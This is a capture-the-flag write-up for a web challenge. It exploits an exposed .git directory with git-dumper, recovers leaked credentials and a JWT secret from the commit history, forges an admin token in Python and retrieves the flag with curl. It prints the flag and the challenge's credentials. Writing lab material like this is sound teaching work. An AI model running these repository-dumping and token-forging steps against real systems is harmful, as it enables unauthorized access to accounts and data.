# Secret Vault

A critical mistake was made, and sensitive information was left behind.

**URL:** https://asdfghjklzxcv-csc26.cybersecuritychallenge.al

## Flag

```
CSC26{s3cr3t_v4ult_unl0ck3d}
```

---

## Solution Steps

### Step 1: Initial Reconnaissance

Visiting the website shows a login page titled "UNTRACKED_SECRETS.SYS" - this is a hint pointing towards version control (Git) issues.

The challenge description mentions "sensitive information was left behind" - classic indicator of exposed `.git` directory.

### Step 2: Discovering Exposed .git Directory

Tested for exposed Git repository:

```
https://asdfghjklzxcv-csc26.cybersecuritychallenge.al/.git/HEAD
```

Response: `ref: refs/heads/main` ✅ **Git directory is exposed!**

### Step 3: Dumping the Git Repository

Used `git-dumper` to extract the entire repository:

```bash
pip install git-dumper
git-dumper "https://asdfghjklzxcv-csc26.cybersecuritychallenge.al/.git/" ./dumped_repo
```

### Step 4: Analyzing Git History

Checked commit history:

```bash
cd dumped_repo
git log --all --oneline
```

Output:

```
5e865c3 (HEAD -> main) test
4b7dafe Made changes to app.js
4524f8f Dev
da07381 First commit
...
```

### Step 5: Finding Leaked Credentials

Compared commits to find what was changed/removed:

```bash
git diff 4524f8f 4b7dafe -- src/app.js src/auth.js
```

**Found leaked credentials in commit `4524f8f` (Dev):**

| Field          | Value                     |
| -------------- | ------------------------- |
| Email          | `arben.shala@pretera.com` |
| Password       | `1yN#2BoE]$)tCs>`         |
| JWT Secret Key | `R3PDZ8T2^maGnE#`         |

The developers replaced these with placeholder values in the next commit, but forgot that Git history preserves everything!

### Step 6: Forging JWT Token

The `/admin` endpoint requires a valid JWT token. Using the leaked secret key, I forged a valid token:

```python
import jwt
import time

token = jwt.encode(
    {'email': 'arben.shala@pretera.com', 'exp': int(time.time()) + 3600},
    'R3PDZ8T2^maGnE#',
    algorithm='HS256'
)
print(token)
```

Generated Token:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFyYmVuLnNoYWxhQHByZXRlcmEuY29tIiwiZXhwIjoxNzY5Nzc3MTU4fQ.A9UxQuxCCwroekDF-bRm3J7myYVeqzprT32t0ixkghQ
```

### Step 7: Accessing Admin Panel

Sent request with forged JWT cookie:

```bash
curl -k --cookie "jwt=<forged_token>" "https://asdfghjklzxcv-csc26.cybersecuritychallenge.al/admin"
```

**Response:**

```html
Welcome to the admin panel!<br></br><h1>Flag: CSC26{s3cr3t_v4ult_unl0ck3d}
```

---

## Vulnerability Summary

| Issue                      | Description                                                 |
| -------------------------- | ----------------------------------------------------------- |
| **Exposed .git Directory** | The `.git` folder was publicly accessible on the web server |
| **Hardcoded Credentials**  | Sensitive credentials were committed to version control     |
| **Insufficient Cleanup**   | Developers removed credentials but didn't purge Git history |
